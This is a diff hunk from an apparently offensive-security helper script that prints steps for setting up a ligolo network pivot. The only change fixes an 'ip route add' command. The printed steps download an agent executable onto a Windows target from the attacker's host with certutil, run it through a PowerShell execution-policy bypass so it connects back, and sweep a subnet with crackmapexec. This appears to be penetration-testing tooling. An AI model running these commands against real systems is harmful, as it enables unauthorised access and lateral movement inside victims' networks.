@@ -43,7 +43,7 @@ printf "\n\n\n\n${GREEN}[!] Instructions for Adding a Pivot [!]${ENDCOLOR}\n"
 printf "1. Transfer agent.exe to the Windows target by running this on Windows target: ${RED}\ncertutil -urlcache -split -f http://$1:443/agent.exe${ENDCOLOR}\n"
 printf "2. Activate agent.exe on the Windows target: ${RED}\npowershell -ep bypass -c 'agent.exe -connect $ip:11601 -ignore-cert'${ENDCOLOR}\n"
 printf "3. After the agent connects to our machine, display network interfaces we want to pivot to in the proxy shell: ${RED}\nifconfig${ENDCOLOR}\n"
-printf "4. Add the network interface IP range we want to add from the ifconfig output: ${RED}\nsudo ip add route x.x.x.0/24 dev ligolo && ip route list${ENDCOLOR}\n"
+printf "4. Add the network interface IP range we want to add from the ifconfig output: ${RED}\nsudo ip route add x.x.x.0/24 dev ligolo && ip route list${ENDCOLOR}\n"
 printf "5. Start the pivot on the ligolo proxy shell on our attack machine: ${RED}\nstart${ENDCOLOR}\n"
 printf "6. Confirm that network pivot works ${RED}\ncrackmapexec smb x.x.x.x/24${ENDCOLOR}"
 
